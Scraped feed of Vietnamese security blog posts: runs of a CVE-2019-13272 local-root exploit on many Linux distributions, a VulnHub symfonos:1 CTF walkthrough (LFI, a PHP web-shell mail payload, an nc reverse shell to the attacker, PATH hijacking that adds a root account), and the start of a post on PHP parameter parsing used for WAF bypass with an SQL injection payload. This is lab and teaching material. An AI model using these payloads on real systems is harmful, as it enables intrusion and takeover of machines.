root@sparkylinux-5-x64:/home/user/47133# id uid=0(root) gid=0(root) groups=0(root),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),104(scanner),107(lpadmin),113(netdev),114(bluetooth),1000(user) root@sparkylinux-5-x64:/home/user/47133#   Ubuntu UbuntuUbuntu 16.04.5 (unity) 1  /usr/lib/unity-settings-daemon/usd-backlight-helper   1 2 3 4 5 6 7 8 9 10 11 12 13 14  user@ubuntu-16-04-5-x64:~/Desktop/kernel-exploits/CVE-2019-13272$ ./a.out Linux 4.10 \u0026lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272) [.] Checking environment ... [~] Done, looks good [.] Searching for known helpers ... [~] Found known helper: /usr/lib/unity-settings-daemon/usd-backlight-helper [~] Using helper: /usr/lib/unity-settings-daemon/usd-backlight-helper [.] Spawning suid process (/usr/bin/pkexec) ... [.] Tracing midpid ... [~] Attached to midpid To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. root@ubuntu-16-04-5-x64:/home/user/Desktop/kernel-exploits/CVE-2019-13272#   Ubuntu 18.04 (gnome) 1  /usr/lib/gnome-settings-daemon/gsd-backlight-helper   1 2 3 4 5 6 7  user@ubuntu:~/Desktop/47133$ ./a.out executing passwd attached to midpid To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. root@ubuntu:/home/user/Desktop/47133#   Ubuntu 19.04 (gnome) 1  /usr/lib/gnome-settings-daemon/gsd-backlight-helper   1 2 3 4 5 6 7  user@ubuntu-19-04-x64:~/Desktop/47133$ ./a.out executing passwd attached to midpid To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. root@ubuntu-19-04-x64:/home/user/Desktop/47133#   Ubuntu Mate 19.04 (mate) 1  /usr/sbin/mate-power-backlight-helper   1 2 3 4 5 6 7  user@ubuntu-mate-19-04-desktop-amd64:~/Desktop/47133$ ./a.out executing passwd attached to midpid To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. root@ubuntu-mate-19-04-desktop-amd64:/home/user/Desktop/47133#   Linux Mint 19-v2 (mate) 1  /usr/sbin/mate-power-backlight-helper   1 2 3 4 5 6 7 8 9  user@linux-mint-19-2:~/Desktop/47133$ ./a.out executing passwd attached to midpid To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. root@linux-mint-19-2:/home/user/Desktop/47133# id uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),128(sambashare),1000(user) root@linux-mint-19-2:/home/user/Desktop/47133#   Elementary OS 0.4.1 (gnome) 1  /usr/lib/gnome-settings-daemon/gsd-backlight-helper   1 2 3 4 5 6 7  user@elementary-os-0-4-1-20170517:~/47133$ ./a.out executing passwd attached to midpid To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. root@elementary-os-0-4-1-20170517:/home/user/47133# exit   Fedora / CentOS / RHEL Fedora 30 Workstation (gnome) 1 2  /usr/libexec/gsd-wacom-led-helper /usr/libexec/gsd-wacom-oled-helper   1 2 3 4 5 6 7 8 9 10 11  [user@localhost CVE-2019-13272]$ ./a.out Linux 4.10 \u0026lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272) [.] Checking environment ... [~] Done, looks good [.] Searching for known helpers ... [~] Found known helper: /usr/libexec/gsd-wacom-led-helper [.] Spawning pkexec ... [.] Tracing midpid ... [~] Attached to midpid [root@localhost CVE-2019-13272]# id uid=0(root) gid=0(root) groups=0(root),10(wheel),1000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023   Arch Manjaro 18.0.3 (xfce) 1  /usr/bin/xfpm-power-backlight-helper   1 2 3 4  [user@manjaro-xfce-18-0-3-x86-64 47133]$ ./a.out executing passwd attached to midpid [manjaro-xfce-18-0-3-x86-64 47133]#    Mageia 6 (gnome) 1  /usr/libexec/gsd-backlight-helper   1 2 3 4  [user@localhost 47133]$ ./a.out executing passwd attached to midpid [root@localhost 47133]#   Antergos 18.7 (gnome) Antergos was recently EOL (last release 2019-04-04)\n1 2  /usr/lib/gsd-wacom-oled-helper /usr/lib/gsd-backlight-helper   1 2 3 4 5 6  [user@antergos 47133]$ ./a.out executing passwd attached to midpid [root@antergos 47133]# id uid=0(root) gid=0(root) groups=0(root),985(users),998(wheel) [root@antergos 47133]# exit   T√†i li·ªáu tham kh·∫£o https://bugs.chromium.org/p/project-zero/issues/detail?id=1903 https://github.com/rapid7/metasploit-framework/issues/12104 https://0day.life/exploit/0day-636.html\n","permalink":"https://minhtuanact.ml/posts/linux-broken-permission-and-object-lifetime-handling-for-ptrace-traceme-chiem-quyen-root-hau-het-cac-may-chay-linux/","summary":"M·ªü ƒë·∫ßu  Ng√†y h√¥m qua, 1 th√†nh vi√™n trong ƒë·ªôi c·ªßa t√¥i ƒë√£ g·ª≠i cho t√¥i 1 b√†i post tr√™n facebook n√≥i v·ªÅ con CVE-2019-13272 n√†y. Sau m·ªôt h·ªìi t√¨m hi·ªÉu th√¨ con CVE n√†y c·ª±c k√¨ nghi√™m tr·ªçng. N√≥ c√≥ th·ªÉ chi·∫øm quy·ªÅn root m√°y c·ªßa b·∫°n ch·ªâ sau ƒë√∫ng m·ªôt n·ªët nh·∫°c. B√†i vi·∫øt n√†y ch·ªâ mang t√≠nh gi·ªõi thi·ªáu, b·∫°n n√†o mu·ªën t√¨m hi·ªÉu v·ªÅ c√°ch th·ª©c ho·∫°t ƒë·ªông c·ªßa con CVE-2019-13272 th√¨ b·∫°n c√≥ th·ªÉ t√¨m hi·ªÉu tr√™n m·∫°ng nh√© ^^.","title":"Linux: broken permission and object lifetime handling for PTRACE_TRACEME - Chi·∫øm quy·ªÅn root h·∫ßu h·∫øt c√°c m√°y ch·∫°y Linux"},{"content":"M·ªü ƒë·∫ßu  L·∫°i l√† m√¨nh ƒë√¢y, v√†o m·∫•y h√¥m r·∫£nh r·ªói l·∫°i m√≤ v√†o vulhub.com ƒë·ªÉ ki·∫øm m·∫•y b√†i lab ƒë·ªÉ h·ªçc h·ªèi, ki·∫øm ƒë∆∞·ª£c b√†i Difficulty: Beginner n√™n build l√™n l√†m lu√¥n xem n√≥ c√≥ Beginner kh√¥ng :v: ƒê√¢y l√† m·ªôt b√†i lab kh√° m·ªõi c·ªßa t√°c gi·∫£ Zayotic trong series symfonos. Link b√†i lab n·∫øu ai mu·ªën kh√°m ph√°: symfonos: 1  T·∫•n c√¥ng   Vi·ªác ƒë·∫ßu ti√™n v·∫´n nh∆∞ th∆∞·ªùng ng√†y, build b√†i lab l√™n r·ªìi qu√©t ƒë·ªãa ch·ªâ ip c·ªßa n√≥. ·ªû ƒë√¢y m√¨nh s·ª≠ d·ª•ng arp-scan ƒë·ªÉ qu√©t cho nhanh.\n1 2 3 4  root@kali: arp-scan -l Interface: eth0, datalink type: EN10MB (Ethernet) Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.19.34\t00:0c:29:a0:2f:e9\tVMware, Inc.     Web g√¨ th·∫ø n√†y, c√≥ m·ªói c√°i ·∫£nh l√† sao, t√¥i l√† ai, ƒë√¢y l√† ƒë√¢u :scream::scream::scream::scream:\n  Th·ª≠ scan t·∫•t c·∫£ c·ªïng tr√™n n√†y xem sao\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  root@kali:~/Desktop# nmap -p- -A 192.168.19.34 Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-10 14:56 +07 Nmap scan report for symfonos.local (192.168.19.34) Host is up (0.00077s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA) | 256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA) |_ 256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, | ssl-cert: Subject: commonName=symfonos | Subject Alternative Name: DNS:symfonos | Not valid before: 2019-06-29T00:29:42 |_Not valid after: 2029-06-26T00:29:42 |_ssl-date: TLS randomness does not represent time 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html). 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP) MAC Address: 00:0C:29:A0:2F:E9 (VMware) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop Service Info: Hosts: symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.08 seconds     Con m√°y n√†y ƒëang s·ª≠ d·ª•ng d·ªãch v·ª• mail smtp, c√≥ samba k√¨a, th·ª≠ v√†o xem c√≥ g√¨ k   C√≥ th∆∞ m·ª•c anonymous, v√†o m·ªü th√¨ th·∫•y c√≥ m·ªôt tin nh·∫Øn c·ªßa th·∫ßn Zeus =))\n1 2 3 4 5  Can users please stop using passwords like \u0026#39;epidioko\u0026#39;, \u0026#39;qwerty\u0026#39; and \u0026#39;baseball\u0026#39;! Next person I find using one of these passwords will be fired! -Zeus     Th·ª≠ m·∫•y c√°i epidioko, qwerty v·ªõi baseball xem th·∫ßn Zeus c√≥ block th·∫≠t hay kh√¥ng :v:\n  Th·ª≠ ƒë∆∞·ª£c th∆∞ m·ª•c helios c√≥ m·∫≠t kh·∫©u l√† qwerty th·∫≠t :joy:\n  C√≥ 2 m·∫©u tin ·ªü ƒë√¢y\n  file research.txt:\n1  Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.     file todo.txt:\n1 2 3  1. Binge watch Dexter 2. Dance 3. Work on /h3l105     Humm, th·ª≠ v√†o http://192.168.19.34/h3l105 xem sao. (√Ä qu√™n, add 192.168.19.34 symfonos.local v√†o /etc/hosts ƒë√£)\n  1 trang Wordpress\n  S·ª≠ d·ª•ng wpscan th√¨ th·∫•y c√≥ l·ªói nh∆∞ sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  root@kali:~# wpscan --url http://symfonos.local/h3l105/ --plugins-detection aggressive [+] mail-masta | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/ | Latest Version: 1.0 (up to date) | Last Updated: 2014-09-19T07:52:00.000Z | Readme: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt | [!] Directory listing is enabled | | Detected By: Known Locations (Aggressive Detection) | | [!] 2 vulnerabilities identified: | | [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI) | References: | - https://wpvulndb.com/vulnerabilities/8609 | - https://www.exploit-db.com/exploits/40290/ | - https://cxsecurity.com/issue/WLB-2016080220 | | [!] Title: Mail Masta 1.0 - Multiple SQL Injection | References: | - https://wpvulndb.com/vulnerabilities/8740 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6095 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6096 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6097 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6098 | - https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin | | Version: 1.0 (100% confidence) | Detected By: Readme - Stable Tag (Aggressive Detection) | - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt     ƒê·ªçc m·ªôt h·ªìi v·ªÅ plugin mail-masta th√¨ ·ªü ƒë√¢y c√≥ d√≠nh Local File Inclusion (LFI)\nhttp://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd   ·ªû file /etc/passwd ta x√°c ƒë·ªãnh ƒë∆∞·ª£c c√≥ nh·ªØng user sau\n1 2 3 4 5  root helios mysql zeus wordpress     Check l·∫°i b·∫±ng smtp-user-enum th√¨ c√≥ ƒë√∫ng 3 users n√†y c√≥ mail.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  root@kali:~# smtp-user-enum -M VRFY -U users.txt -t 192.168.19.34 Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum ) ---------------------------------------------------------- | Scan Information | ---------------------------------------------------------- Mode ..................... VRFY Worker Processes ......... 3 Usernames file ........... users.txt Target count ............. 1 Username count ........... 3 Target TCP port .......... 25 Query timeout ............ 3 secs Target domain ............ ######## Scan started at Wed Jul 10 16:07:52 2019 ######### 192.168.19.34: root exists 192.168.19.34: helios exists 192.168.19.34: mysql exists ######## Scan completed at Wed Jul 10 16:07:53 2019 ######### 3 results.     Ch·∫Øc h·∫≥n l√† ph·∫£i c√≥ th∆∞ m·ª•c ch·ª©a mail, m√¨nh c√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c mail ng∆∞·ªùi kh√°c g·ª≠i ƒë·∫øn helios   Th·ª≠ g·ª≠i th∆∞ v·ªõi payload cho helios xem sao\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  root@kali:~# telnet 192.168.19.34 25 Trying 192.168.19.34... Connected to 192.168.19.34. Escape character is \u0026#39;^]\u0026#39;. 220 symfonos.localdomain ESMTP Postfix (Debian/GNU) HELO localhost 250 symfonos.localdomain MAIL FROM: tuan@symfonos.localdomain 250 2.1.0 Ok RCPT TO: helios 250 2.1.5 Ok DATA 354 End data with \u0026lt;CR\u0026gt;\u0026lt;LF\u0026gt;.\u0026lt;CR\u0026gt;\u0026lt;LF\u0026gt; \u0026lt;?php system($_GET[\u0026#39;c\u0026#39;]); ?\u0026gt;     Gi·ªù ta s·ª≠ d·ª•ng ƒë∆∞·ªùng d·∫´n sau ƒë·ªÉ ki·ªÉm tra xem sao:\nview-source:http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios\u0026amp;c=id   Ok th√†nh c√¥ng r·ªìi, ch√∫ng ta ƒë√£ c√≥ 1 ch√∫ shell =))\n  Ti·∫øp theo th√¨ ta remote ƒë·∫øn n√≥ th√¥i\n  ƒê·∫ßu ti√™n th√¨ m·ªü nc -lvp 4444 b√™n m√°y m√¨nh ƒë√£\n  S·ª≠ d·ª•ng http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios\u0026amp;c=nc%20-e%20/bin/bash%20-nv%20192.168.19.100%204444 ƒë·ªÉ remote ng∆∞·ª£c v·ªÅ.   Ngon, ch√∫ng ta ƒë√£ c√≥ m√°y victim r·ªìi :v:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  helios@symfonos:/home$ find / -perm -u=s 2\u0026gt;/dev/null find / -perm -u=s 2\u0026gt;/dev/null /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/openssh/ssh-keysign /usr/bin/passwd /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/chsh /usr/bin/chfn /opt/statuscheck /bin/mount /bin/umount /bin/su /bin/ping helios@symfonos:/home$     C√≥ v·∫ª nh∆∞ /opt/statuscheck c√≥ th·ªÉ khai th√°c ƒë∆∞·ª£c, th·ª≠ run n√≥ l√™n xem c√≥ g√¨ k\n1 2 3 4 5 6 7 8 9 10 11  helios@symfonos:/opt$ ./statuscheck ./statuscheck HTTP/1.1 200 OK Date: Thu, 11 Jul 2019 01:49:50 GMT Server: Apache/2.4.25 (Debian) Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT ETag: \u0026#34;148-58c6b9bb3bc5b\u0026#34; Accept-Ranges: bytes Content-Length: 328 Vary: Accept-Encoding Content-Type: text/html     Humm, n√≥ ch·ªâ ki·ªÉm tra c√°i trang web c√≥ Ok hay k, th·ª≠ ch·∫°y strings /opt/statuscheck th√¨ ra 1 ƒëo·∫°n n√†y\n1 2 3  curl -I H http://lH ocalhostH   D·ªãch ra s·∫Ω l√†:\n1  curl -I http://localhost     Ch√∫ng ta c·∫ßn kh√°m ph√° ƒë∆∞·ª£c l·ªánh th·ª±c thi n√†y\n  C√≥ v√†i ph∆∞∆°ng th·ª©c, nh∆∞ng ·ªü trong tr∆∞·ªùng h·ª£p n√†y, d·ª±a tr√™n ƒë·∫ßu ra curl ... n√≥ ƒëang th·ª±c thi v·ªõi ƒë∆∞·ªùng d·∫´n t∆∞∆°ng ƒë·ªëi c·ªßa n√≥, c√≥ nghƒ©a l√†, v·ªõi ƒë∆∞·ªùng d·∫´n c√≥ trong bi·∫øn m√¥i tr∆∞·ªùng $PATH\n1 2  PATH ABSOLUTE: /usr/bin/curl PATH RELATIVELY: curl     Vi·ªác c·ªßa ch√∫ng ta b√¢y gi·ªù l√† ph·∫£i thay ƒë·ªïi bi·∫øn $PATH c·ªßa helios v√† chuy·ªÉn h∆∞·ªõng c·ªßa ch∆∞∆°ng tr√¨nh statuscheck sang m·ªôt th·ª© m√† ta c√≥ th·ªÉ ki·ªÉm so√°t ƒë∆∞·ª£c. Thay v√¨ ch·∫°y trong /usr/bin/curl, ta s·∫Ω ƒëi·ªÅu h∆∞·ªõng v·ªÅ ƒë·ªÉ n√≥ th·ª±c thi trong /tmp/curl ch·∫≥ng h·∫°n.\n  Gi·ªù ch√∫ng ta v√†o th∆∞ m·ª•c /tmp r·ªìi t·∫°o 1 file curl, trong file ƒë√≥ c√≥ th·ª© m√¨nh mu·ªën ƒë·ªÉ n√≥ ch·∫°y l√™n v·ªõi quy·ªÅn root, v√¨ khi ch·∫°y /opt/statuscheck, n√≥ s·∫Ω k√≠ch ho·∫°t quy·ªÅn root l√™n. V√† v·ªõi c√°i curl gi·∫£ kia, b·∫°n c√≥ th·ªÉ ch·∫°y quy·ªÅn root v·ªõi n·ªôi dung l√† b√™n trong c√°i file curl v·ª´a t·∫°o.\n  ·ªû ƒë√¢y m√¨nh s·∫Ω ch·ªçn c√°ch th√™m lu√¥n 1 t√†i kho·∫£n root v√†o h·ªá th·ªëng.\n  C·∫•u tr√∫c c·ªßa file /etc/passwd: username:password_crypt:user_id:group_id:name:home_directory:shell\n  V·∫≠y gi·ªù m√¨nh s·∫Ω t·∫°o 1 file nh∆∞ n√†y : minhtuan:x:0:0:root:/root:/usr/bin/bash v·ªõi x l√† m·∫≠t kh·∫©u ƒë∆∞·ª£c crypt.\nM√¨nh s·∫Ω s·ª≠ d·ª•ng perl ƒë·ªÉ crypt password.\n1 2  root@kali:~# perl -e \u0026#39;print crypt(\u0026#34;minhtuanact\u0026#34;, \u0026#34;ahihi\u0026#34;)\u0026#39; ahd.h7gFshGUw     V·∫≠y ahd.h7gFshGUw l√† password crypt, ho√†n thi·ªán ƒëo·∫°n th√™m user kia s·∫Ω l√†:\n1  minhtuan:ahd.h7gFshGUw:0:0:root:/root:/usr/bin/bash     Gi·ªù s·∫Ω ghi v√†o file /tmp/curl v·ªõi n·ªôi dung s·∫Ω l√†\n1  echo minhtuan:ahd.h7gFshGUw:0:0:root:/root:/bin/bash \u0026gt;\u0026gt; /etc/passwd   L·ªánh n√†y n√≥ s·∫Ω th√™m c√°i t√†i kho·∫£n c·ªßa m√¨nh m·ªõi t·∫°o kia v√†o /etc/passwd. Gi·ªù s·∫Ω ph·∫£i ƒë√°nh l·ª´a statuscheck ƒë·ªÉ n√≥ ch·∫°y c√°i th·∫±ng curl gi·∫£ kia l√™n r·ªìi ƒëƒÉng nh·∫≠p v·ªõi t√†i kho·∫£n v·ª´a t·∫°o l√† xong :v:\n  X√∫c th√¥i :v:\n1 2 3 4 5 6  helios@symfonos:/tmp$ export PATH=/tmp export PATH=/tmp helios@symfonos:/tmp$ /opt/statuscheck /opt/statuscheck sh: 1: curl: Permission denied helios@symfonos:/tmp$     ∆† Permission denied, √† ch·∫øt qu√™n ch∆∞a c·∫•p quy·ªÅn cho file curl :joy:\n1 2 3 4 5 6 7 8 9  helios@symfonos:/tmp$ export PATH=$PATH_BACKUP export PATH=$PATH_BACKUP helios@symfonos:/tmp$ chmod +x curl chmod +x curl helios@symfonos:/tmp$ export PATH=/tmp export PATH=/tmp helios@symfonos:/tmp$ /opt/statuscheck /opt/statuscheck helios@symfonos:/tmp$     Ok r·ªìi, th·ª≠ switch sang t√†i kho·∫£n v·ª´a ƒë∆∞·ª£c t·∫°o xem (tr∆∞·ªõc ti√™n ph·∫£i ch·∫°y export PATH=$PATH_BACKUP tr∆∞·ªõc nh√©, kh√¥ng l√† k c√≥ l·ªánh th·ª±c thi ƒë√¢u)\n1 2 3 4 5 6  helios@symfonos:/tmp$ su minhtuan su minhtuan Password: minhtuanact root@symfonos:/tmp# id id uid=0(root) gid=0(root) groups=0(root)     V·∫≠y l√† ta ƒë√£ c√≥ quy·ªÅn root r·ªìi. ƒê·ªçc c·ªù cu·ªëi th√¥i   T·ªïng k·∫øt  B√†i n√†y ·ªü m·ª©c ƒë·ªô Beginner nh∆∞ng m√¨nh ch·∫≥ng th·∫•y n√≥ Beginner t√Ω n√†o l·∫Øm :joy::joy: Mong c√°c b·∫°n c√≥ th·ªÉ h·ªçc h·ªèi ƒë∆∞·ª£c g√¨ th√¥ng qua b√†i n√†y. N·∫øu c√°c b·∫°n c·∫£m th·∫•y hay th√¨ cho m√¨nh 1 upvote nh√© :D  ","permalink":"https://minhtuanact.ml/posts/vulnhub-ctf-symfonos-1-van-la-mot-vai-plugin-cua-wordpress-can-than-khi-su-dung-plugin-ben-wordpress-smtp-tu-lfi-cho-den-remote-code-excecution/","summary":"M·ªü ƒë·∫ßu  L·∫°i l√† m√¨nh ƒë√¢y, v√†o m·∫•y h√¥m r·∫£nh r·ªói l·∫°i m√≤ v√†o vulhub.com ƒë·ªÉ ki·∫øm m·∫•y b√†i lab ƒë·ªÉ h·ªçc h·ªèi, ki·∫øm ƒë∆∞·ª£c b√†i Difficulty: Beginner n√™n build l√™n l√†m lu√¥n xem n√≥ c√≥ Beginner kh√¥ng :v: ƒê√¢y l√† m·ªôt b√†i lab kh√° m·ªõi c·ªßa t√°c gi·∫£ Zayotic trong series symfonos. Link b√†i lab n·∫øu ai mu·ªën kh√°m ph√°: symfonos: 1  T·∫•n c√¥ng   Vi·ªác ƒë·∫ßu ti√™n v·∫´n nh∆∞ th∆∞·ªùng ng√†y, build b√†i lab l√™n r·ªìi qu√©t ƒë·ªãa ch·ªâ ip c·ªßa n√≥.","title":"VulnHub CTF - symfonos: 1 - V·∫´n l√† m·ªôt v√†i plugin c·ªßa Wordpress, c·∫©n th·∫≠n khi s·ª≠ d·ª•ng plugin b√™n Wordpress - SMTP - T·ª´ LFI cho ƒë·∫øn Remote Code Excecution"},{"content":"M·ªü ƒë·∫ßu  Nh∆∞ b·∫°n ƒë√£ bi·∫øt, PHP converts query string (trong URL ho·∫∑c body) th√†nh m·ªôt m·∫£ng b√™n trong $_GET ho·∫∑c $_POST. V√≠ d·ª•: /?foo=bar s·∫Ω tr·ªü th√†nh Array([foo] =\u0026gt; \u0026quot;bar\u0026quot;). Query string parsing s·∫Ω lo·∫°i b·ªè ho·∫∑c thay th·∫ø m·ªôt s·ªë k√Ω t·ª± trong t√™n ƒë·ªëi s·ªë b·∫±ng d·∫•u g·∫°ch d∆∞·ªõi. V√≠ d·ª•: /?%20news[id%00=42 s·∫Ω ƒë∆∞·ª£c chuy·ªÉn th√†nh Array([news_id] =\u0026gt; 42). N·∫øu IDS/IPS ho·∫∑c WAF c√≥ rules ch·∫∑n ho·∫∑c ghi nh·∫≠t k√Ω c√°c gi√° tr·ªã kh√¥ng ph·∫£i l√† s·ªë trong tham s·ªë news_id th√¨ c√≥ th·ªÉ b·ªè qua b·∫±ng c√°ch s·ª≠ d·ª•ng parsing process v·ªõi n·ªôi dung nh∆∞ sau: 1  /news.php?%20news[id%00=42\u0026#34;+AND+1=0--    Trong PHP, gi√° tr·ªã c·ªßa argument name trong v√≠ d·ª• tr√™n %20news[id%00 s·∫Ω ƒë∆∞·ª£c l∆∞u tr·ªØ t·∫°i $_GET[\u0026quot;news_id\u0026quot;].  T·∫°i sao   PHP c·∫ßn chuy·ªÉn ƒë·ªïi t·∫•t c·∫£ c√°c ƒë·ªëi s·ªë th√†nh m·ªôt t√™n bi·∫øn h·ª£p l·ªá, v√¨ v·∫≠y khi chu·ªói truy v·∫•n ƒë∆∞·ª£c ph√¢n t√≠ch, n√≥ th·ª±c hi·ªán 2 ƒëi·ªÅu ch√≠nh:\n Lo·∫°i b·ªè kho·∫£ng tr·∫Øng ban ƒë·∫ßu Chuy·ªÉn ƒë·ªïi m·ªôt s·ªë k√Ω t·ª± th√†nh d·∫•u g·∫°ch d∆∞·ªõi (bao g·ªìm c·∫£ kho·∫£ng tr·∫Øng)    V√≠ d·ª•\n   USER INPUT DECODED PHP VARIABLE NAME     %20foo_bar%00 foo_bar foo_bar   foo%20bar%00 foo bar foo_bar   foo%5bbar foo[bar foo_bar      V·ªõi m·ªôt v√≤ng l·∫∑p ƒë∆°n gi·∫£n nh∆∞ sau, b·∫°n c√≥ th·ªÉ ki·ªÉm tra xem k√Ω t·ª± n√†o b·ªã x√≥a ho·∫∑c chuy·ªÉn ƒë·ªïi th√†nh d·∫•u g·∫°ch d∆∞·ªõi b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m parser_str: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  \u0026lt;?php foreach( [ \u0026#34;{chr}foo_bar\u0026#34;, \u0026#34;foo{chr}bar\u0026#34;, \u0026#34;foo_bar{chr}\u0026#34; ] as $k =\u0026gt; $arg) { for($i=0;$i\u0026lt;=255;$i++) { echo \u0026#34;\\033[999D\\033[K\\r\u0026#34;; echo \u0026#34;[\u0026#34;.$arg.\u0026#34;] check \u0026#34;.bin2hex(chr($i)).\u0026#34;\u0026#34;; parse_str(str_replace(\u0026#34;{chr}\u0026#34;,chr($i),$arg).\u0026#34;=bla\u0026#34;,$o); /* yes... I\u0026#39;ve added a sleep time on each loop just for the scenic effect :) like that movie with unrealistic brute-force where the password are obtained one byte at a time (‚à©ÔΩÄ-¬¥)‚äÉ‚îÅ‚òÜÔæü.*ÔΩ•ÔΩ°Ôæü */ usleep(5000); if(isset($o[\u0026#34;foo_bar\u0026#34;])) { echo \u0026#34;\\033[999D\\033[K\\r\u0026#34;; echo $arg.\u0026#34; -\u0026gt; \u0026#34;.bin2hex(chr($i)).\u0026#34; (\u0026#34;.chr($i).\u0026#34;)\\n\u0026#34;; } } echo \u0026#34;\\033[999D\\033[K\\r\u0026#34;; echo \u0026#34;\\n\u0026#34;; }     pasrse_str ƒë∆∞·ª£c s·ª≠ d·ª•ng qua GET, POST v√† cookie. C≈©ng t∆∞∆°ng t·ª± v·ªõi c√°c ti√™u ƒë·ªÅ n·∫øu server web c·ªßa b·∫°n ch·∫•p nh·∫≠n t√™n ti√™u ƒë·ªÅ c√≥ d·∫•u ch·∫•m ho·∫∑c kho·∫£ng tr·∫Øng. T√¥i ƒë√£ th·ª±c hi·ªán 3 l·∫ßn v√≤ng l·∫∑p ·ªü tr√™n, li·ªát k√™ t·∫•t c·∫£ c√°c k√≠ t·ª± ascii t·ª´ 0 ƒë·∫øn 255 ·ªü c·∫£ 2 ƒë·∫ßu c·ªßa t√™n tham s·ªë v√† thay v√¨ d·∫•u g·∫°ch d∆∞·ªõi, ƒë√¢y l√† k·∫øt qu·∫£ thu ƒë∆∞·ª£c:\n [1st]foo_bar foo[2nd]bar foo_bar[3rd]     Trong s∆° ƒë·ªì tr√™n, foo%20bar v√† foo+bar l√† t∆∞∆°ng ƒë∆∞∆°ng v·ªõi foo bar.\n  Suricata   ƒê·ªëi v·ªõi nh·ªØng ng∆∞·ªùi k bi·∫øt, Suricata l√† \u0026ldquo;m·ªôt c√¥ng c·ª• ph√°t hi·ªán m·ªëi ƒëe d·ªça m√£ ngu·ªìn m·ªü, nhanh v√† m·∫°nh m·∫Ω\u0026rdquo; v√† c√¥ng c·ª• c·ªßa n√≥ c√≥ kh·∫£ nƒÉng ph√°t hi·ªán x√¢m nh·∫≠p 